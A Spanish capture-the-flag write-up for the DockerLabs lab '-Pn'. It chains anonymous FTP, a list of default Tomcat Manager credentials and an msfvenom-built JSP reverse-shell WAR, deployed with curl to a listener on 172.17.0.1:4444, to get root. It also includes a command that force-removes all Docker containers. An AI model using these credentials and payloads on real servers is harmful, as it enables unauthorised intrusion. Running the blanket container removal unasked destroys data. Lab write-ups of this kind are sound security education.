---
title: "DockerLabs - -Pn"
difficulty: "Fácil"
source: "DockerLabs"
---

-Pn es una máquina orientada a la explotación del panel de administración de Apache Tomcat mediante credenciales por defecto, para después realizar intrusión al servidor desplegando un payload malicioso.

## Despliegue

```bash
bash auto_deploy.sh -Pn.tar
```

## Reconocimiento

```bash
nmap -sV -p- 172.17.0.2
```

Puertos detectados:
- **21/tcp** — FTP (vsftpd)
- **8080/tcp** — HTTP (Apache Tomcat 9.0.88)

### FTP anónimo

El servidor FTP permite login anónimo:

```bash
ftp 172.17.0.2
# user: anonymous / pass: (vacío)
```

Dentro hay un fichero `tomcat.txt` con el mensaje:
> "Hello tomcat, can you configure the tomcat server? I lost the password..."

Esto confirma que el usuario de Tomcat es **`tomcat`** y que las credenciales podrían ser por defecto.

### Tomcat Manager

El panel de administración está en `http://172.17.0.2:8080/manager/html`.

**Importante:** si la IP del contenedor es `.3` en lugar de `.2`, Tomcat devuelve **403** (restricción por IP en `context.xml`). Para obtener la `.2`, eliminar otros contenedores Docker activos y redesplegar:

```bash
docker rm -f $(docker ps -aq)
bash auto_deploy.sh -Pn.tar
```

Con la IP correcta (`.2`), el panel responde **401** (autenticación requerida).

## Explotación

### Credenciales por defecto

Con el usuario `tomcat` identificado via FTP, se probaron las credenciales por defecto documentadas en HackTricks:

| Usuario | Contraseña |
|---------|-----------|
| admin | admin |
| admin | password |
| admin | Password1 |
| admin | tomcat |
| both | tomcat |
| j2deployer | j2deployer |
| ovwebusr | OvW*busr1 |
| cxsdk | kdsxc |
| root | owaspbwa |
| manager | manager |
| role1 | role1 |
| role1 | tomcat |
| role | changethis |
| root | changethis |
| tomcat | tomcat |
| tomcat | s3cret |
| tomcat | s3cr3t |
| xampp | xampp |

```bash
curl -o /dev/null -s -w "%{http_code}" -u tomcat:s3cret http://172.17.0.2:8080/manager/html
```

Credenciales válidas: `tomcat:s3cret` → HTTP 200

### Reverse shell via WAR

```bash
# Generar payload
msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.17.0.1 LPORT=4444 -f war -o /tmp/shell.war

# Listener
nc -lvnp 4444

# Desplegar via curl
curl -u tomcat:s3cret -T /tmp/shell.war "http://172.17.0.2:8080/manager/text/deploy?path=/shell&update=true"

# Activar la shell
curl http://172.17.0.2:8080/shell/
```

También se puede subir el WAR desde la interfaz web del Manager en la sección **Deploy**.

## Post-explotación

```bash
whoami
# root
```

El proceso de Tomcat corre bajo el usuario root dentro del contenedor. No fue necesaria escalada de privilegios.

## Conclusión

La máquina combina dos vectores sencillos encadenados: un FTP con acceso anónimo que filtra el nombre de usuario del sistema, y un Tomcat Manager accesible con credenciales por defecto. Una vez dentro del Manager, el despliegue de un WAR malicioso otorga RCE inmediato.

**Lecciones aprendidas:**
- Los servicios FTP anónimos pueden filtrar información crítica aunque no permitan escritura.
- Las credenciales por defecto de Tomcat son ampliamente conocidas — cambiarlas es lo primero en producción.
- El Tomcat Manager expuesto en red equivale a RCE garantizado con credenciales débiles.
- Tomcat 9 divide el acceso al Manager entre distintos roles (`manager-gui`, `manager-script`, etc.).
